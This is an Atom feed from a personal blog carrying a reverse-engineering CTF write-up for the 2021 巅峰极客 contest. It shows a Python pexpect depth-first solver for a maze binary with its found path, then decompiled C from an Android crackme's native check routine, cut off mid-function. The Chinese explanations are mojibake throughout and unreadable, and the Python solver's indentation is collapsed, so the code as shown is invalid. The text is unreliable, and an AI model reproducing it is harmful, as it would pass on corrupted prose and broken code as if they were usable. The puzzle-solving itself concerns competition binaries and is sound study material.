<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bxb0&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.bxnop.cn/"/>
  <updated>2021-08-08T03:39:09.066Z</updated>
  <id>https://www.bxnop.cn/</id>
  
  <author>
    <name>ooo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021å·…å³°æå®¢</title>
    <link href="https://www.bxnop.cn/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
    <id>https://www.bxnop.cn/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</id>
    <published>2021-08-01T01:37:20.000Z</published>
    <updated>2021-08-08T03:39:09.066Z</updated>
    
    <content type="html"><![CDATA[<p>é€†å‘é¢˜è§£~<a id="more"></a></p><h3 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h3><p>å¸¸è§çš„è¿·å®«é¢˜ï¼Œä½†è€ƒæ³•å´ä¸å¸¸è§ï¼Œæ²¡æœ‰ç›´æ¥çš„åœ°å›¾ï¼Œåªæ˜¯ç»™å‡ºæ¯èµ°ä¸€æ­¥çš„ç¨‹åºçš„åé¦ˆï¼Œæç¤ºæ˜¯å¦é‡åˆ°éšœç¢ï¼Œæ˜¯å¦åˆ°å¯ä»¥é€šè¡Œï¼Œæ˜¯å¦åˆ°è¾¾ç»ˆç‚¹ã€‚</p><p>ç¨‹åºå°±æ˜¯é€šè¿‡æ¯èµ°ä¸€æ­¥ï¼Œè°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚</p><p>æ„Ÿè§‰ä¸Šæ–¹æ³•å¾ˆå¤šçš„ï¼Œè¿™é‡Œæˆ‘æ˜¯é‡‡ç”¨ä¸ç¨‹åºäº¤äº’å†™ä¸€ä¸ªdfsæ¥è·‘ã€‚</p><p>é¦–å…ˆäº¤äº’é‡‡ç”¨çš„pexpectæ¨¡å—ï¼Œç„¶åæŠŠç¨‹åºä¸­æç¤ºæ­£ç¡®ä¿¡æ¯çš„å­—ç¬¦ä¸²éƒ½æ”¹ä¸ºï¼šâ€œ1\r\nâ€ï¼Œåˆ°è¾¾ç»ˆç‚¹çš„å­—ç¬¦ä¸²æ”¹ä¸ºäº†ï¼šâ€œ2\r\nâ€ï¼Œæ–¹ä¾¿åˆ¤æ–­äº¤äº’æ•°æ®ã€‚</p><p>å…¶æ¬¡å†™è¿™ä¸ªdfsæ¥ä¸ç¨‹åºäº¤äº’è·‘è¿·å®«å’Œå¸¸è§„çš„æœ‰åœ°å›¾è‡ªå·±è·‘è¦æ³¨æ„ä¸€ç‚¹ï¼Œ<strong>åœ¨æ¯æ¬¡èµ°ä¸€æ­¥åè¿”å›åˆ°ä¸Šä¸€å±‚çš„æ—¶å€™è¦åŠ ä¸€ä¸ªæ­¥éª¤ï¼šå¾€å›èµ°çš„æ­¥éª¤</strong>ï¼Œå› ä¸ºè¿™æ˜¯åœ¨ç¨‹åºäº¤äº’ã€‚</p><p>åˆšå¼€å§‹æˆ‘å†™è¿™ä¸ªè¿·å®«ï¼Œä»¥ä¸ºç¨‹åºå¯èƒ½å°±æ˜¯å‡ åæ­¥å§ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰å»åšä»€ä¹ˆè¿‡æ»¤ï¼Œåé¢è·‘çš„æ—¶å€™å‘ç°æ­¥æ•°è¿œä¸æ­¢å‡ åï¼Œï¼Œèµ·ç ä¸Šç™¾ï¼Œè¯´æ˜è¿™ä¸ªåœ°å›¾æ˜¯å¾ˆå¤§çš„ï¼Œè¿™æ ·ç›´æ¥è·‘æ—¶é—´ä¸Šè‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚ã€‚</p><p>æ¥ä¸‹æ¥æ”¹è¿›ï¼Œæƒ³åˆ°æˆ‘å¯ä»¥å¼€å§‹åˆå§‹åŒ–ä¸€ä¸ªå¤§çš„è¿·å®«ï¼Œè®©ç¨‹åºåœ¨è·‘çš„æ—¶å€™æ ¹æ®å›æ˜¾æ˜¯éšœç¢ç‰©æ¥åœ¨åˆå§‹åŒ–çš„è¿·å®«ä¸Šè®°å½•è¿™æ˜¯ä¸€ä¸ªéšœç¢ç‚¹ï¼ˆmaze[x][y] = 1ï¼‰ã€‚</p><p>æœ€åç¨‹åºåœ¨10åˆ†é’Ÿè·‘å‡ºäº†ç»“æœï¼Œå‹‰å¼ºèƒ½æ¥å—ï¼Œè™½ç„¶è¿˜æ˜¯å¾ˆæ…¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">next = [[<span class="number">0</span>, <span class="number">-1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>,<span class="number">1</span>], [<span class="number">-1</span>, <span class="number">0</span>]]</span><br><span class="line">d = <span class="string">"ASDW"</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line">back = &#123;<span class="string">'W'</span>:<span class="string">'S'</span>, <span class="string">'S'</span>:<span class="string">'W'</span>, <span class="string">'A'</span>:<span class="string">'D'</span>, <span class="string">'D'</span>:<span class="string">'A'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_str</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    s += i</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(step, x, y)</span>:</span></span><br><span class="line">print(do_str(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="comment">#print(do_str(flag))</span></span><br><span class="line">flag[step] = d[i]</span><br><span class="line">flag[step+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">nx = x+next[i][<span class="number">0</span>]</span><br><span class="line">ny = y+next[i][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> maze[nx][ny] == <span class="number">1</span> <span class="keyword">or</span> book[nx][ny] == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">r.sendline(d[i])</span><br><span class="line">ans = r.readline()</span><br><span class="line"><span class="comment">#print(ans)</span></span><br><span class="line"><span class="keyword">if</span> ans == <span class="string">b'1\r\n'</span>:</span><br><span class="line">book[nx][ny] = <span class="number">1</span></span><br><span class="line">dfs(step+<span class="number">1</span>, nx, ny)</span><br><span class="line">book[nx][ny] = <span class="number">0</span></span><br><span class="line">r.sendline(back[d[i]])</span><br><span class="line">r.readline()</span><br><span class="line"><span class="keyword">elif</span> ans == <span class="string">b'2\r\n'</span>:</span><br><span class="line">print(<span class="string">"found: "</span>, do_str(flag))</span><br><span class="line">t1 = time()</span><br><span class="line">print(<span class="string">"time: "</span>, t1-t)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">maze[nx][ny] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">t = time()</span><br><span class="line">maze=[[<span class="number">0</span>]*<span class="number">1000</span>]*<span class="number">1000</span></span><br><span class="line">book=[[<span class="number">0</span>]*<span class="number">1000</span>]*<span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">book[i]=[<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line">r = pexpect.spawn(<span class="string">'./maze'</span>)</span><br><span class="line">r.readline()</span><br><span class="line">r.readline()</span><br><span class="line">ans = r.readline()</span><br><span class="line">print(ans)</span><br><span class="line">maze[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">maze[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="string">'S'</span></span><br><span class="line">r.sendline(<span class="string">'S'</span>)</span><br><span class="line">ans = r.readline()</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">found:  SSSSSSSSSDDDDDDWWWWAAWWAAWWDDDDDDDDDDDDDDDDDDDDSSDDSSAASSSSAAAAWWAAWWWWAASSSSSSAASSDDSSSSDDWWWWDDSSDDDDWWDDDDDDWWAAAAWWDDDDWWAAWWWWDDSSDDSSSSSSSSSSDDDDSSAAAASSSSSSAASSSSAAWWAASSSSDDDDDDDDDDSSDDSSAASSSSAASSSSSSSSDDWWWWWWDDWWWWDDWWWWDDSSSSSSSSAASSSSDDDDSSDDDDWWDDSSDDSSDDDDDDDDSSDDSSSSDDDDSSDDSSSSSSDDSSSSDDDDSSSSDDDDDDSSSSDDSSDSSASSSSAASSDDSSAASSDDDDDDSSDDDDWWDDSSSSSSDDDDWWAAWWWWDDDDSSSSDDDDDDSSAASSSSSSDDDDDDDDSSDDDDSSSSSSDDWWDDDDDDSSSSSSSSAASSDDSSSSSSAASSDDS</span><br><span class="line">time:  655.1350808143616</span><br></pre></td></tr></table></figure><h3 id="medical-app"><a href="#medical-app" class="headerlink" title="medical_app"></a>medical_app</h3><p>ç®—æ˜¯å¾ˆå¸¸è§„çš„ä¸€ä¸ªå®‰å“é¢˜äº†ï¼Œå°±nativeå±‚é€»è¾‘å¾ˆæ˜æ˜¾çš„åŠ å¯†ã€‚</p><p>åšçš„æ—¶å€™å‘ç°è¿™ä¸ªä¸åŒæ¶æ„çš„soå»idaåç¼–è¯‘çš„ç»“æœåŒºåˆ«çœŸçš„å¤§ï¼Œï¼Œæ²¡æœ‰ç»éªŒï¼Œæˆ‘å¼€å§‹é€‰æ‹©äº†ç†Ÿæ‚‰çš„x86æ¶æ„çš„å»çœ‹ğŸ˜…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">cdecl <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v22; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v23; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [esp+8h] [ebp-264h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v28; <span class="comment">// [esp+Ch] [ebp-260h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// [esp+10h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+10h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v31; <span class="comment">// [esp+14h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+14h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v33; <span class="comment">// [esp+18h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+18h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v35; <span class="comment">// [esp+1Ch] [ebp-250h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v36; <span class="comment">// [esp+20h] [ebp-24Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// [esp+24h] [ebp-248h]</span></span><br><span class="line">  <span class="keyword">char</span> *v38; <span class="comment">// [esp+2Ch] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v39; <span class="comment">// [esp+30h] [ebp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+34h] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v41; <span class="comment">// [esp+38h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">int</span> v42; <span class="comment">// [esp+40h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v43; <span class="comment">// [esp+4Ch] [ebp-220h]</span></span><br><span class="line">  _OWORD v44[<span class="number">16</span>]; <span class="comment">// [esp+50h] [ebp-21Ch]</span></span><br><span class="line">  _OWORD v45[<span class="number">17</span>]; <span class="comment">// [esp+150h] [ebp-11Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v3);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = (<span class="keyword">char</span> *)v3;</span><br><span class="line">    v44[<span class="number">15</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">14</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">13</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">12</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">11</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">10</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">9</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">7</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">6</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">5</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">0</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">15</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">14</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">13</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">12</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">11</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">10</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">9</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">7</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">6</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">5</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">0</span>] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v44 + v5) = v5;</span><br><span class="line">      *((_BYTE *)v45 + v5) = *((_BYTE *)&amp;d + (v5 &amp; <span class="number">0xF</span>));</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">256</span> );</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">-256</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> __int8 *)v45 + v7);</span><br><span class="line">      v9 = v8 + v6;</span><br><span class="line">      v10 = *((<span class="keyword">char</span> *)&amp;v45[<span class="number">16</span>] + v7);</span><br><span class="line">      v11 = v10 + v9 + <span class="number">255</span>;</span><br><span class="line">      v12 = v10 + v9;</span><br><span class="line">      <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        v11 = v12;</span><br><span class="line">      v6 = v12 - (v11 &amp; <span class="number">0xFFFFFF00</span>);</span><br><span class="line">      *((_BYTE *)v45 + v7) = *((_BYTE *)v44 + v6);</span><br><span class="line">      *((_BYTE *)v44 + v6) = v8;</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 );</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v14 = <span class="number">-36</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v13 + <span class="number">256</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)(v13 + <span class="number">1</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        v16 = v13 + <span class="number">1</span>;</span><br><span class="line">      v13 = v13 - (v16 &amp; <span class="number">0xFFFFFF00</span>) + <span class="number">1</span>;</span><br><span class="line">      v17 = *((<span class="keyword">unsigned</span> __int8 *)v44 + v13);</span><br><span class="line">      v18 = v15 + v17 + <span class="number">255</span>;</span><br><span class="line">      v19 = v17 + v15;</span><br><span class="line">      <span class="keyword">if</span> ( v19 &gt;= <span class="number">0</span> )</span><br><span class="line">        v18 = v19;</span><br><span class="line">      v15 = v19 - (v18 &amp; <span class="number">0xFFFFFF00</span>);</span><br><span class="line">      v20 = v14;</span><br><span class="line">      *((_BYTE *)v44 + v13) = *((_BYTE *)v44 + v15);</span><br><span class="line">      *((_BYTE *)v44 + v15) = v17;</span><br><span class="line">      v38[v14 + <span class="number">36</span>] ^= *((_BYTE *)v44 + (<span class="keyword">unsigned</span> __int8)(v17 + *((_BYTE *)v44 + v13)));</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v20 != <span class="number">-1</span> );</span><br><span class="line">    v21 = *((_DWORD *)v38 + <span class="number">8</span>);</span><br><span class="line">    v37 = *(_DWORD *)v38;</span><br><span class="line">    v22 = *((_DWORD *)v38 + <span class="number">1</span>);</span><br><span class="line">    v27 = *((_DWORD *)v38 + <span class="number">3</span>);</span><br><span class="line">    v28 = *((_DWORD *)v38 + <span class="number">4</span>);</span><br><span class="line">    v31 = *((_DWORD *)v38 + <span class="number">5</span>);</span><br><span class="line">    v33 = *((_DWORD *)v38 + <span class="number">6</span>);</span><br><span class="line">    v39 = *((_DWORD *)v38 + <span class="number">2</span>);</span><br><span class="line">    v29 = *((_DWORD *)v38 + <span class="number">7</span>);</span><br><span class="line">    v43 = <span class="number">-11</span>;</span><br><span class="line">    v23 = <span class="number">-1621657930</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v40 = (v23 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      v42 = *((_DWORD *)&amp;d + v40);</span><br><span class="line">      v37 += (((v21 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v22)) + ((v22 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v21))) ^ ((v23 ^ v22) + (v42 ^ v21));</span><br><span class="line">      v41 = v31;</span><br><span class="line">      v32 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">1</span>));</span><br><span class="line">      v22 += (((v37 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v39)) + ((v39 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v37))) ^ ((v23 ^ v39) + (v37 ^ v32));</span><br><span class="line">      v36 = v33;</span><br><span class="line">      v34 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">2</span>));</span><br><span class="line">      v24 = v39 + ((((v22 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v27)) + ((v27 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v22))) ^ ((v23 ^ v27) + (v22 ^ v34)));</span><br><span class="line">      v35 = v29;</span><br><span class="line">      v30 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">3</span>));</span><br><span class="line">      v39 = v24;</span><br><span class="line">      v27 += (((v24 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v28)) + ((v28 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v24))) ^ ((v23 ^ v28) + (v24 ^ v30));</span><br><span class="line">      v25 = v28 + ((((v27 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v41)) + ((v41 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v27))) ^ ((v23 ^ v41) + (v27 ^ v42)));</span><br><span class="line">      v28 = v25;</span><br><span class="line">      v31 = v41 + ((((v25 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v36)) + ((v36 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v25))) ^ ((v23 ^ v36) + (v25 ^ v32)));</span><br><span class="line">      v33 = v36 + ((((v31 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v35)) + ((v35 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v31))) ^ ((v23 ^ v35) + (v31 ^ v34)));</span><br><span class="line">      v29 = v35 + ((((v33 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v21)) + ((v21 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v33))) ^ ((v23 ^ v21) + (v33 ^ v30)));</span><br><span class="line">      